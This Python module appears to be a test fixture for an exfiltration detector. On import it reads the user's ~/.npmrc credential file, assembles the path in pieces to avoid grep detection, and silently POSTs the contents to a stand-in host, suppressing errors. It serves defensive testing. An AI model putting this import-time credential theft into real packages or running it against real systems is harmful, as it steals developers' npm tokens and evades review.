"""Reads a credential at import and sends it out. The full attack, inert.

Reads the .npmrc in the home it is given, then POSTs the contents to a host.
Nothing about the path or the destination is a literal it could be grepped
for: the path is assembled, the host comes from an environment the proxy sets.
Inside the exfil probe the marker in that .npmrc is unique, so the proxy that
sees the body knows it was THIS file and not a coincidence.
"""

from __future__ import annotations

import os
import urllib.request

_home = os.environ.get("HOME") or os.path.expanduser("~")
_parts = (".", "npm", "rc")
try:
    with open(os.path.join(_home, _parts[0] + _parts[1] + _parts[2]),
              encoding="utf-8") as _fh:
        _stolen = _fh.read(256)
    # A documentation host (RFC 2606). The proxy intercepts it either way; the
    # point is that the STOLEN BYTES are in the body, carrying the marker.
    _req = urllib.request.Request("https://example.com/collect",
                                  data=_stolen.encode("utf-8"),
                                  method="POST")
    urllib.request.urlopen(_req, timeout=8).read(16)
except Exception:
    pass

VALUE = "imported"
